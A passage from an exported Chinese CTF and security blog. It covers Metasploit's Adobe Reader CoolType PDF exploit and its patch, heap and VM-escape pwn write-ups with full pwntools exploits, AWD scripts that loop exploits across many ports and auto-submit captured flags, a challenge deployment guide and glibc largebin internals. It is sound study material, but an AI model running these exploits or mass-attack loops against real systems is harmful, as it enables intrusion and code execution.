Trailer主要包含了指向交叉引用表的指针以及一些关键对象的指针并且以%%EOF标记文件结束，帮助符合标准的阅读器能够快速定位到需要的对象。所有的PDF阅读器都是要从这里开始解析。 了解完PDF基本格式。秉承着用到什么再提什么的原则，我们这里通过分析MSF提供的exp来帮助理解PDF文档的构造过程。 定位到 def make_pdf(ttf, js) 的部分，这里是创建pdf的核心位置。 来到/opt/metasploit-framework/embedded/framework/modules/exploits/windows/fileformat/adobe_cooltype_sing.rb 这个脚本是用ruby语言编写的，对于ruby语法的相关细节本文不再赘述。 定位到 def make_pdf(ttf, js) 的部分，这里是创建pdf的核心位置。 123xref = []eol = \"n\"endobj = \"endobj\" &lt;&lt; eol 看到首先定义了几个接下来会用到的字符以及交叉引用表xref。 12pdf = \"%PDF-1.5\" &lt;&lt; eolpdf &lt;&lt; \"%\" &lt;&lt; random_non_ascii_string(4) &lt;&lt; eol 这里描述的是Header部分的内容，首先定义了版本号，这个样本遵循的是PDF1.5版本。 接下来调用了一个random_non_ascii_string函数 1234567def random_non_ascii_string(count) result = \"\" count.times do result &lt;&lt; (rand(128) + 128).chr end resultend 该函数用于随机出不再ASCII范围内的字符。换句话说这里随机了4个字符。关于这四个字符的作用。Adobe给出的PDF文档里是这样描述的 If a PDF file contains binary data, as most do, the header line shall be immediately followed by a comment line containing at least four binary characters—that is ,characters whose codes are 128 or greater. This ensures proper behaviour of file transfer applications that inspect data near the beginning of a file to determine whether to treat the file‘s contents as text or as binary. 这四个code大于128的字符用于确保当前PDF文档被当作二进制文件来对待而不是文本文件。 看完了Header部分的实现，再看Body部分的实现之前，先来了解一下Body部分大致的组织结构。 继续往下看会看到catalog对象的定义 123456789xref &lt;&lt; pdf.lengthpdf &lt;&lt; io_def(1) &lt;&lt; n_obfu(\"&lt;&lt;\") &lt;&lt; eolpdf &lt;&lt; n_obfu(\"/Pages \") &lt;&lt; io_ref(2) &lt;&lt; eolpdf &lt;&lt; n_obfu(\"/Type /Catalog\") &lt;&lt; eolpdf &lt;&lt; n_obfu(\"/OpenAction \") &lt;&lt; io_ref(11) &lt;&lt; eol# The AcroForm is required to get icucnv36.dll to loadpdf &lt;&lt; n_obfu(\"/AcroForm \") &lt;&lt; io_ref(13) &lt;&lt; eolpdf &lt;&lt; n_obfu(\"&gt;&gt;\") &lt;&lt; eolpdf &lt;&lt; endobj 这里用到了两个io_def和n_obfu函数。此处的xref &lt;&lt; pdf.length用于记录对象的偏移量。 123def io_def(id) \"%d 0 obj n\" % idend 漏洞修复下载AdobeReader 9.4.0版本提取CoolType.dll，定位到相同的位置 很显然这里不再是调用strcat而是改为调用sub_813391E函数 12345678910111213141516171819202122.text:0813391E push esi.text:0813391F mov esi, [esp+4+arg_0].text:08133923 push esi ; char *.text:08133924 call strlen.text:08133929 pop ecx.text:0813392A mov ecx, [esp+4+arg_8].text:0813392E cmp ecx, eax.text:08133930 ja short loc_8133936.text:08133932 mov eax, esi.text:08133934 pop esi.text:08133935 retn.text:08133936 loc_8133936: ; CODE XREF: sub_813391E+12↑j.text:08133936 sub ecx, eax.text:08133938 dec ecx.text:08133939 push ecx ; size_t.text:0813393A push [esp+8+arg_4] ; char *.text:0813393E add eax, esi.text:08133940 push eax ; char *.text:08133941 call ds:strncat.text:08133947 add esp, 0Ch.text:0813394A pop esi.text:0813394B retn 该函数获取了字段的长度，判断是否超出限制。如果超出限制就用strncat限制了拷贝的字节数从而修复了该漏洞。 参考资料https://www.anquanke.com/post/id/179681#h2-1 漏洞战争p15","tags":[{"name":"CVE","slug":"CVE","permalink":"wood1314.github.io/tags/CVE/"}]},{"title":"Rctf writeup","date":"2020-06-04T09:18:19.000Z","path":"year/06/04/cl6ewld9f0014j63f5ruv77ag/","text":"没去打比赛，留着慢慢复现~ 0x1 note现在刷来刷去，觉得堆体最大的作用就是让自己调试越来越熟练，看ida越来越熟练，没学到什么新的知识，后面要多刷能让自己学到东西的题目，多复现CVE了。 1.1 漏洞分析 所有的下标判断没有判断负数 有一个函数里存在堆溢出 1.2 利用技巧 calloc不会使用tcache tcache链不会判断chunk的size 1.3 利用思路 用show泄露libc 用add和sell布置好tcache链 用溢出函数覆盖fd 三次malloc拿shell 1.4 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *sh = process('./note')context.log_level = 'debug'context.terminal = ['tmux', 'splitw', '-h']def add(idx, size): sh.recvuntil(\": \") sh.sendline('1') sh.recvuntil('Index: ') sh.sendline(str(idx)) sh.recvuntil(\": \") sh.sendline(str(size))def sell(idx): sh.recvuntil(\": \") sh.sendline('2') sh.recvuntil(\": \") sh.sendline(str(idx))def edit(idx, content): sh.recvuntil(\": \") sh.sendline('4') sh.recvuntil(\": \") sh.sendline(str(idx)) sh.recvuntil(': \\n') sh.send(content)def show(idx): sh.recvuntil(\": \") sh.sendline('3') sh.recvuntil(': ') sh.sendline(str(idx))def once(idx,content): sh.recvuntil(\": \") sh.sendline('7') sh.recvuntil(\": \") sh.sendline(str(idx)) sh.recvuntil(': \\n') sh.send(content)def New(content): sh.recvuntil(\": \") sh.sendline('6') sh.recvuntil(': \\n') sh.send(content)#gdb.attach(sh)show(-5)data_addr = u64(sh.recv(8))sh.recv(16)libcbase = u64(sh.recv(8)) - 0x1e5760one_gadget = libcbase + 0xe237flog.success('data_addr: ' + hex(data_addr))log.success('libc_base: ' + hex(libcbase))#set moneypayload = p64(data_addr) + p32(0xffffff)edit(-5,payload+'\\n')#ready chunkadd(0,0x50)add(1,0x50)sell(1)#tcache poisionmalloc_hook = libcbase + 0x1e4c30content = ''content += 'a'*0x50content += p64(0) + p64(0x61)content += p64(malloc_hook)once(0,content+'\\n')#malloc twiceNew(\"a\"+'\\n')sell(-2)New(p64(one_gadget)+'\\n')sell(-2)sh.recvuntil(': ')sh.sendline('6')#gdb.attach(sh)sh.interactive()","tags":[{"name":"writeup","slug":"writeup","permalink":"wood1314.github.io/tags/writeup/"}]},{"title":"pwn题部署","date":"2020-06-01T12:04:29.000Z","path":"year/06/01/cl6ewldam003tj63ftkozv5rg/","text":"ctfd上的pwn题部署，服务器系统centos docker, docker-compose安装123456789yum updateyum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repoyum install -y docker-cesystemctl start dockersystemctl enable dockeryum -y install epel-releaseyum -y install python-pippip install -i https://pypi.tuna.tsinghua.edu.cn/simple docker-compose Pwn题部署基于xinted + docker 12345git clone https://github.com/Eadom/ctf_xinetd.gitrm ctf_xinetd/bin/helloworldcp pwn ctf_xinetd/bin/pwnecho &lt;newflag&gt; &gt; ctf_xinetd/bin/flagvim ctf_xinetd/ctf.xinetd ctf.xinetd中主要修改server_args = --userspec=1000:1000 /home/ctf ./helloworld中的helloworld为二进制文件名称(pwn). 123cd ctf_xinetdsudo docker build -t &quot;mypwn&quot; .sudo docker run -d -p &quot;0.0.0.0:8001:9999&quot; -h &quot;mypwn&quot; --name=&quot;mypwn&quot; mypwn pwn题要先关闭缓冲区. 123setvbuf(stdin, 0LL, 2, 0LL);setvbuf(stdout, 0LL, 2, 0LL);setvbuf(stderr, 0LL, 2, 0LL); 完成后可以nc 127.0.0.1 端口号来查看是否成功 阿里云等服务器需要把设置的端口添加到安全组里否则远程可能无法连接上","tags":[{"name":"tools","slug":"tools","permalink":"wood1314.github.io/tags/tools/"}]},{"title":"网鼎杯writeup","date":"2020-05-12T15:03:29.000Z","path":"year/05/12/cl6ewldbg005pj63fwvgnmk3v/","text":"0x0 前言这次的pwn基本上都是vm pwn，虚拟指令集，这类题代码量大，需要逆向时间长。但做这类题的关键点在于找到虚拟机中和真实环境的交互点，找到可以泄露真实地址的方式之后这种题基本就稳了。 0x1 boom11.1 题目分析与解题思路这道题就是一个语言解析器，也就是你输入什么代码就执行什么，但是函数只能用一次。 而这道题逃逸的突破口在于它可以用程序里的变量来泄露它真机中的真实地址。 解题思路是用它自身的变量来获取libc，然后打exit_hook即可。 12345678910111213141516171819202122232425262728293031323334from pwn import *r = process('./boom1')context.log_level = 'DEBUG'#gdb.attach(r)payload = '''int buf ;int main() &#123; int a; int ptr; int libc_base; ptr = &amp;buf; libc_base = ptr - 0x503010; ptr = libc_base + 0x5f0f48; read(0,ptr,3); return 0;&#125;'''r.recvline()r.sendline(payload)r.recv(timeout=1)r.recv(timeout=1)#gdb.attach(r)r.send('\\x47\\xe1\\xAf')# libc = int(r.recvline(),16)# print \"libc: \" + hex(libc)r.interactive() 1.2 libc位置情况下的偏移爆破由于libc版本未知，远程偏移未知，所以需要爆破偏移,从-99到99爆破，从网上找到了别人爆破的脚本，学到了新的知识。 12345678910111213141516171819if __name__ == \"__main__\": for x in range(-99, 99): ············ libc.address = leaked - 0x612500 - 0x1000 * x success(\"libc -&gt; &#123;:#x&#125;\".format(libc.address)) ··········· try: io.recv() io.sendline(\"ls\") if \"flag\" in io.recv(): io.interactive() else: io.close() io = remote(\"node3.buuoj.cn\", 27119) # io = process(\"./hardcore_fmt\") except Exception: io.close() # io = process(\"./hardcore_fmt\") io = remote(\"node3.buuoj.cn\", 27119) 0x2 boom22.1 分析题目首先用malloc分配了两块内存，分析后得出一块是栈，代码段，分析前面这块的行为，它把真实的栈地址push到了虚拟的栈中，这里是突破的一个关键点，提供了我们突破虚拟机的限制来与虚拟内存之外进行交互。 然后看下图，我们输入的内容是进入到buf中的，也就是代码段，然后程序对我们的输入进行取址，译码。 再下一步就是根据取到的指令进行执行 经过分析以后可知,各操作数对应的指令为(带imm的指令就是有一个原操作数是立即数) 12345678910111213141516171819202122232425260 imm: temp = ebp_now + imm1 imm: temp = imm;6 imm: push ebp_now; ebp_now = esp_now; esp_now -= imm;8 : leave; ret;9 : temp = *(qword*)temp 10 : temp = *(char*)temp11 : **esp_now = temp; ++esp_now; 8byte12 : **esp_now = temp; ++esp_now; 1byte13 : push temp14 : temp |= *esp now; pop;15 : temp ^= *esp now; pop;16 : temp &amp;= *esp now; pop;17 : temp = temp == *esp now; pop;18 : != 19 : &lt;20 : &gt;21 : &lt;=22 : &gt;=23 : &lt;&lt;24 : &gt;&gt;25 : +26 : temp = *esp_now - temp;27 : *28 : /29 : %30 : exit 2.2 解题思路 先用14指令pop一下，这个时候temp中存的就是真实的栈指针了 再利用1指令和26计算出返回地址的位置，13来把计算结果存到栈上 用9指令获取返回地址里的内容（libc_start_main+231)，然后再用13保存到栈上 利用1和26计算libc基址，然后再用13保存到栈上 利用1和25计算onegadget的偏移 最后利用11把onegadget写入返回地址 2.3 exp12345678910111213141516from pwn import * p=process(\"./pwn\")libc231=0x7f9848c0cb97-0x7f9848beb000onegadget=0x4f2c5print p.recv()payload=p64(14) #步骤1payload+=p64(1)+p64(0xe8)+p64(26)+p64(13) #步骤2payload+=p64(9)+p64(13) #步骤3payload+=p64(1)+p64(libc231)+p64(26)+p64(13) #步骤4payload+=p64(1)+p64(onegadget)+p64(25) #步骤5payload+=p64(11) #步骤6p.send(payload) #步骤7p.interactive() 0x3 faster0这个题，乍一看要做一百次选择，然后最后进入func100，有一个很简单的栈溢出，最笨的方法就是一个一个把100个都过了，也可以。但感觉会有更简单的方法，比如是不是能让atoi返回大于10的数，然后一直走func000，然后再直接跳到func095,不过自己没有实现。放一个学弟写的脚本。 1234567891011121314151617181920212223242526272829from pwn import * from LibcSearcher import LibcSearchercontext.log_level = 'DEBUG'sh = process('./faster0')num = '''4 9 4 9 6 0 3 4 1 65 9 1 9 3 2 2 2 0 09 6 9 9 1 4 8 9 4 61 5 7 5 0 3 5 6 5 83 6 2 6 5 5 7 3 2 84 4 4 7 7 5 2 1 6 70 3 4 8 6 0 0 3 1 10 7 8 2 7 1 9 5 6 99 3 4 7 7 5 3 7 2 38 7 2 5 2 2 6 6 6 3'''rdi_ret = 0x0000000000406013rsi_r15_ret = 0x0000000000406011write_got = 0x609018write_plt = 0x400640start_addr = 0x4006c0num = num.replace(' ','')num = num.replace('\\n','')sh.sendline(num)sh.recvuntil('WOW,U R GREAT !\\n')payload = 'a' * 0xd8 + p64(rdi_ret) + p64(1) + p64(rsi_r15_ret) + p64(write_got) + p64(0)payload += p64(write_plt) + p64()sh.send(payload)sh.interactive()","tags":[{"name":"vm","slug":"vm","permalink":"wood1314.github.io/tags/vm/"}]},{"title":"awd 通打pwn脚本记录一波","date":"2020-04-26T09:22:38.000Z","path":"year/04/26/cl6ewld9u001tj63f683rzl1h/","text":"0x0 前言第一次线上awd，交flag是交的真的爽，也算是对awd的流程有所熟悉了。题目不难，但是深感自己写脚本速度还是不够快。 0x1 第一题double_free,然后改就是把free函数给弄没了。。。。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687import osfrom pwn import *def add(index,size,content): sh.sendline('1') sh.recvuntil('index&gt;&gt; ') sh.sendline(str(index)) sh.recvuntil('size&gt;&gt; ') sh.sendline(str(size)) sh.recvuntil('name&gt;&gt; ') sh.sendline(content) sh.recvuntil('Your Choice\\n')def delete(index): sh.sendline('2') sh.recvuntil('index&gt;&gt; ') sh.sendline(str(index)) sh.recvuntil('Your Choice\\n') def edit(index,content): sh.sendline('3') sh.recvuntil('index&gt;&gt; ') sh.sendline(str(index)) sh.recvuntil('name&gt;&gt; ') sh.sendline(content) def show(index): sh.sendline('5') sh.recvuntil('index&gt;&gt; ') sh.sendline(str(index)) content = sh.recv(6) # log.info(content) sh.recvuntil('Your Choice\\n') return contentip = \"39.100.119.37\"def get_shell(ip, port): sh = remote(ip, port) sh.recvuntil('Your Choice\\n') add(0,0x100,'a') #0 add(1,0x60,'b') #1 add(9,0x30,'ss') delete(0) libc_base = u64(show(0).ljust(8,'\\x00')) - 0x3c4b78 log.success('libc_base = ' + hex(libc_base)) one_gadget = libc_base + 0xf02a4 malloc_hook = libc_base + 0x3c4b10 fake_fast = malloc_hook - 0x13 add(2,0x60,'c') add(3,0x60,'3') delete(1) delete(2) delete(1) delete(9) add(4,0x60,p64(fake_fast)) add(5,0x60,'z') add(6,0x60,'ss') add(7,0x60,'a' * 0x3 + p64(one_gadget)) sh.sendline('2') sh.recvuntil('index&gt;&gt; ') sh.sendline(str(1)) return shdef get_flag(ip, port): try: r = get_shell(ip, port) r.sendline(\"cat flag\\n\") print r.recv(100) r.close() except KeyError as e: print('KeyError') except IndexError as e: print('IndexError') except TypeError as e: print('TypeError') except ValueError as e: print('ValueError') except Exception as e: print('Exception')port = 41080for i in range(20): get_flag(ip, port + i * 100) 0x2 第二题还是个double_free,同样把free给改没了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100import osfrom pwn import *token = \"7hQvn3AnHrtjaFmFN2MxztbCM4hGRQECZKEvJzu2dtSfU\"url = \"http://10.66.20.15/api/v1/jad/web/submit_flag/?event_id=2\"ips=[]context.timeout = 1def add(index,size,content): sh.sendline('1') sh.recvuntil('index&gt;&gt; ') sh.sendline(str(index)) sh.recvuntil('size&gt;&gt; ') sh.sendline(str(size)) sh.recvuntil('name&gt;&gt; ') sh.sendline(content) sh.recvuntil('Your Choice\\n')def delete(index): sh.sendline('2') sh.recvuntil('index&gt;&gt; ') sh.sendline(str(index)) sh.recvuntil('Your Choice\\n') def edit(index,content): sh.sendline('3') sh.recvuntil('index&gt;&gt; ') sh.sendline(str(index)) sh.recvuntil('name&gt;&gt; ') sh.sendline(content) def show(index): sh.sendline('5') sh.recvuntil('index&gt;&gt; ') sh.sendline(str(index)) content = sh.recv(6) # log.info(content) sh.recvuntil('Your Choice\\n') return contentfor i in range(3,30): ips.append(\"4\" + str(i + 2).rjust(2,'0') + \"80\")# print ipsdef get_shell(ip): global sh sh = remote('39.100.119.37', int(ip,10)) sh.recvuntil('Your Choice\\n') add(0,0x100,'a') #0 add(1,0x60,'b') #1 add(9,0x30,'ss') delete(0) libc_base = u64(show(0).ljust(8,'\\x00')) - 0x3c4b78 log.success('libc_base = ' + hex(libc_base)) one_gadget = libc_base + 0xf02a4 malloc_hook = libc_base + 0x3c4b10 fake_fast = malloc_hook - 0x13 add(2,0x60,'c') add(3,0x60,'3') delete(1) delete(2) delete(1) delete(9) add(4,0x60,p64(fake_fast)) add(5,0x60,'z') add(6,0x60,'ss') add(7,0x60,'a' * 0x3 + p64(one_gadget)) sh.sendline('2') sh.sendline('1') return shdef get_flag(ip): try: sh = get_shell(ip) #sh.interactive() sh.sendline('cat ?l?g') sleep(0.5) sh.sendline('cat flag') flag = sh.recvall(timeout= 1) log.success(flag) sh.close() except KeyError as e: print('KeyError') except IndexError as e: print('IndexError') except TypeError as e: print('TypeError') except ValueError as e: print('ValueError') except Exception as e: print('Exception')for ip in ips: # if ip[7:9] == \"16\" or ip[7:9] == \"17\" or ip[7:8] == \"8\" or ip[7:8] == \"6\": # continue get_flag(ip) 自动提交脚本12345678910111213141516171819202122232425import requestsdef tjflag1(flag): url=\"http://39.100.119.37:8080/api/v1/challenges/attempt\" #data=&#123;\"challenge_id\":2,\"submission\":\"\"+flag+\"\"&#125; data='&#123;\"challenge_id\":2,\"submission\":\"'+flag+'\"&#125;' h = &#123;\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0\",\"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\"Accept-Language\": \"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\",\"Accept-Encoding\": \"gzip, deflate\",\"CSRF-Token\":\"e9817606c5e5373499bd7e43b64c045b60a276b839b340c4f4a37c2eb27f4e8a\",\"Connection\": \"keep-alive\",\"Content-Type\": \"application/json\"&#125; cookies=&#123;\"session\":\"2deefa03-cda6-41fc-be25-a986067c7048\",\"PHPSESSID\":\"jnr3quolg5o2ohlifbdld6bku5\"&#125; req=requests.post(url=url,data=data,cookies=cookies,headers=h) print(req.text)def ftjflag1(): with open(\"./web2.txt\") as f: for a in f: print(a.strip()) tjflag1(a.strip())ftjflag1() 整理flag的正则12flag=re.findall(r&apos;flag&#123;[a-zA-Z0-9\\-]*&#125;&apos;, data)[0] flag_file.write(flag+&quot;\\n&quot;) 0x3 第二次awd pwn1脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151import osfrom pwn import *token = \"7hQvn3AnHrtjaFmFN2MxztbCM4hGRQECZKEvJzu2dtSfU\"url = \"http://10.66.20.15/api/v1/jad/web/submit_flag/?event_id=2\"ips=[]context.timeout = 1def add(size,content): sh.recvuntil(\"choice:\") sh.sendline('1') sh.recvuntil(\"How long is your secret?\\n\") sh.sendline(str(size)) sh.recvuntil(\"So,tell me your secret:\\n\") sh.sendline(content)def delete(idx): sh.recvuntil(\"choice:\") sh.sendline('2') sh.recvuntil('Which secret do you want to drop off?') sh.sendline(str(idx))fo = open(\"foo.txt\", \"w\")for i in range(3,28): ips.append(\"1\" + str(i).rjust(2,'0') + \"80\")# print ipsdef get_shell(ip): global sh sh = remote('39.100.119.37', int(ip,10)) #sh = process('./pwn') sh.send('iwanaflag') print sh.recv(timeout=0.5) payload = '\\x00' * 0x40 sh.sendline(payload) #gdb.attach(sh) sh.recvuntil('4. exit') sh.sendline('4') sh.recvuntil('Here is shell box!\\n') payload = 'ls\\x00,/bin/sh' sh.send(payload) #sh.interactive() return shdef get_flag(ip): try: sh = get_shell(ip) #sh.interactive() sh.sendline('cat flag') #sh.sendline('cat flag') #sh.interactive() flag = sh.recvall(timeout=0.2) fo.write(flag) sh.close() except KeyError as e: print('KeyError') except IndexError as e: print('IndexError') except TypeError as e: print('TypeError') except ValueError as e: print('ValueError') except Exception as e: print('Exception')for ip in ips: # if ip[7:9] == \"16\" or ip[7:9] == \"17\" or ip[7:8] == \"8\" or ip[7:8] == \"6\": # continue get_flag(ip) python经常碰到一些缩进问题的报错，很烦人","tags":[{"name":"awd","slug":"awd","permalink":"wood1314.github.io/tags/awd/"}]},{"title":"largebin_attack","date":"2020-04-11T10:14:56.000Z","path":"year/04/11/cl6ewlda5002kj63f0wf1tq3x/","text":"0x00 前言largebin attack 以前就是稍微看过，没怎么做过题，这里总结下largebin的管理机制,然后做一两道题练手然后就开始深入内核pwn的学习了。感觉自己刷题还是不够，等以赛代练吧。 0x01 lagrgebin 管理机制large bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下： 组 数量 公差 1 32 64B 2 16 512B 3 8 4096B 4 4 32768B 5 2 262144B 6 1 不限制 与smallbin不同的是，largebin中不再是一个index只对应一个大小的size，而是存储等差数列变化的chunk块。其相关定义如下： 这个宏写的真的是十分优雅 1234567#define largebin_index_64(sz) \\ (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 48) ? 48 + (((unsigned long) (sz)) &gt;&gt; 6) :\\ ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ? 91 + (((unsigned long) (sz)) &gt;&gt; 9) :\\ ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\\ ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\\ ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\\ 126) largebin管理的是一个范围区间的堆块，此时fd_nextsize与bk_nextsize就派上了用场。 大小对应相同index中的堆块，其在链表中的排序方式为： 堆块从大到小排序。 对于相同大小的堆块，最先释放的堆块会成为堆头，其fd_nextsize与bk_nextsize会被赋值，其余的堆块释放后都会插入到该堆头结点的下一个结点，通过fd与bk链接，形成了先释放的在链表后面的排序方式，且其fd_nextsize与bk_nextsize都为0。 不同大小的堆块通过堆头串联，即堆头中fd_nextsize指向比它小的堆块的堆头，bk_nextsize指向比它大的堆块的堆头，从而形成了第一点中的从大到小排序堆块的方式。同时最大的堆块的堆头的bk_nextsize指向最小的堆块的堆头，最小堆块的堆头的fd_nextsize指向最大堆块的堆头，以此形成循环双链表。 接下来具体看源码中是如何实现将largebin chunk从unsorted bin中取下来放入到largebin中的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162/* place chunk in bin */ if (in_smallbin_range (size)) &#123; ... // chunk为smallbin，放入到smallbin中 &#125; else &#123; victim_index = largebin_index (size);//第一步，获取当前要插入的chunk对应的index bck = bin_at (av, victim_index); //当前index中最小的chunk fwd = bck-&gt;fd; //当前index中最大的chunk /* maintain large bins in sorted order */ if (fwd != bck) &#123; // 该chunk对应的largebin index中不为空 /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0); if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) //第三步，如果要插入的chunk的size小于当前index中最小chunk的大小，则直接插入到最后面。 &#123; fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; else &#123; assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); while ((unsigned long) size &lt; fwd-&gt;size) //第四步，如果插入的chunk不为最小，则通过`fd_nextsize`从大到小遍历chunk，找到小于等于要插入chunk的位置 &#123; fwd = fwd-&gt;fd_nextsize; assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); &#125; if ((unsigned long) size == (unsigned long) fwd-&gt;size) /* Always insert in the second position. */ fwd = fwd-&gt;fd; //第五步，如果存在堆头，则插入到堆头的下一个节点 else &#123; //第六步，否则这个chunk将会成为堆头，`bk_nextsize`和`fd_nextsize`将被置位 victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; bck = fwd-&gt;bk; &#125; &#125; else //第二步，chunk对应的largebin index中为空 victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim; &#125; mark_bin (av, victim_index); //设置fd与bk完成插入 victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim; ... &#125; 整个流程可以总结为： 找到当前要插入的chunk对应的largebin的index，并定位该index中的最小的chunkbck和最大的chunkfwd。 如果fwd等于bck，表明当前链表为空，则直接将该chunk插入，并设置该chunk为该大小堆块的堆头，将bk_nextsize和fd_nextsize赋值为它本身。 如果fwd不等于bck，表明当前链表已经存在chunk，要做的就是找到当前chunk对应的位置将其插入。首先判断其大小是否小于最小chunk的size，(size) &lt; (bck-&gt;bk-&gt;size)，如果小于则说明该chunk为当前链表中最小的chunk，即插入位置在链表末尾，无需遍历链表，直接插入到链表的末尾，且该chunk没有对应的堆头，设置该chunk为相应堆大小堆的堆头，将bk_nextsize指向比它大的堆头，fd_nextsize指向双链表的第一个节点即最大的堆头。 如果当前chunk的size不是最小的chunk，则从双链表的第一个节点即最大的chunk的堆头开始遍历，通过fd_nextsize进行遍历，由于fd_nextsize指向的是比当前堆头小的堆头，因此可以加快遍历速度。直到找到小于等于要插入的chunk的size。 如果找到的chunk的size等于要插入chunk的size，则说明当前要插入的chunk的size已经存在堆头，那么只需将该chunk插入到堆头的下一个节点。 如果找到的chunk的size小于当前要插入chunk的size，则说明当前插入的chunk不存在堆头，因此该chunk会成为堆头插入到该位置，设置fd_nextsize与bk_nextsize。 通过源码分析可以与之前的排序方式对应上，接下来我们再看largebin是如何被申请出来的。 相关源代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465/* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */ if (!in_smallbin_range (nb)) &#123; bin = bin_at (av, idx); //找到申请的size对应的largebin链表 /* skip scan if empty or largest chunk is too small */ if ((victim = first (bin)) != bin &amp;&amp; (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) //第一步，判断链表的第一个结点，即最大的chunk是否大于要申请的size &#123; victim = victim-&gt;bk_nextsize; while (((unsigned long) (size = chunksize (victim)) &lt; (unsigned long) (nb))) //第二步，从最小的chunk开始，反向遍历 chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环 victim = victim-&gt;bk_nextsize; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) //第三步，申请的chunk对应的chunk存在多个结点，则申请相应堆头的下个结点，不申请堆头。 victim = victim-&gt;fd; remainder_size = size - nb; unlink (av, victim, bck, fwd); //第四步，largebin unlink 操作 /* Exhaust */ if (remainder_size &lt; MINSIZE) //第五步，如果剩余的空间小于MINSIZE，则将该空间直接给用户 &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; &#125; /* Split */ else &#123; remainder = chunk_at_offset (victim, nb); //第六步，如果当前剩余空间还可以构成chunk，则将剩余的空间放入到unsorted bin中。 /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ bck = unsorted_chunks (av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) &#123; errstr = \"malloc(): corrupted unsorted chunks\"; goto errout; &#125; remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); &#125; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; 可以将整个流程总结为： 找到当前要申请的空间对应的largebin链表，判断第一个结点即最大结点的大小是否大于要申请的空间，如果小于则说明largebin中没有合适的堆块，需采用其他分配方式。 如果当前largebin中存在合适的堆块，则从最小堆块开始，通过bk_nextsize反向遍历链表，找到大于等于当前申请空间的结点。 为减少操作，判断找到的相应结点（堆头）的下个结点是否是相同大小的堆块，如果是的话，将目标设置为该堆头的第二个结点，以此减少将fd_nextsize与bk_nextsize赋值的操作。 调用unlink将目标largebin chunk从双链表中取下。 判断剩余空间是否小于MINSIZE，如果小于直接返回给用户。 否则将剩余的空间构成新的chunk放入到unsorted bin中。 再看下unlink的源码： 1234567891011121314151617181920212223242526272829303132333435/* Take a chunk off a bin list */#define unlink(AV, P, BK, FD) &#123; \\ if (__builtin_expect (chunksize(P) != (next_chunk(P))-&gt;prev_size, 0)) \\ malloc_printerr (check_action, \"corrupted size vs. prev_size\", P, AV); \\ FD = P-&gt;fd; \\ BK = P-&gt;bk; \\ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); \\ else &#123; \\ FD-&gt;bk = BK; \\ BK-&gt;fd = FD; \\ if (!in_smallbin_range (P-&gt;size) \\ &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; \\ if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) \\ || __builtin_expect 